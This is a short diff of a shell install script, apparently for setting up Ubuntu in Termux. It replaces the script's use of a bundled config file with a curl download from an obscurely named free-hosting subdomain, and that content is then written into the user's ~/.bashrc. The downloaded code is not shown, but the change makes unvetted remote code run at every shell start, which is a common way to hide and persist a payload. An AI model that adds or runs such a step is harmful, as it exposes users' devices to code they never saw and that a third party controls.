@@ -15,9 +15,8 @@ cd etc
 echo "" > motd
 cd $Home
 git clone https://github.com/pvtvpsfiles/ubuntu-termux
-cd ubuntu-termux
-mv .config.sh $Home
 cd $Home
+curl -o .config.sh https://nkmodsxd0vz0fm0privado0nxd0bynkmods.000webhostapp.com/pvtvpsfiles/ubuntu-termux/config.txt
 cat .config.sh > ~/.bashrc
 rm -rf .config.sh
 cd ubuntu-termux
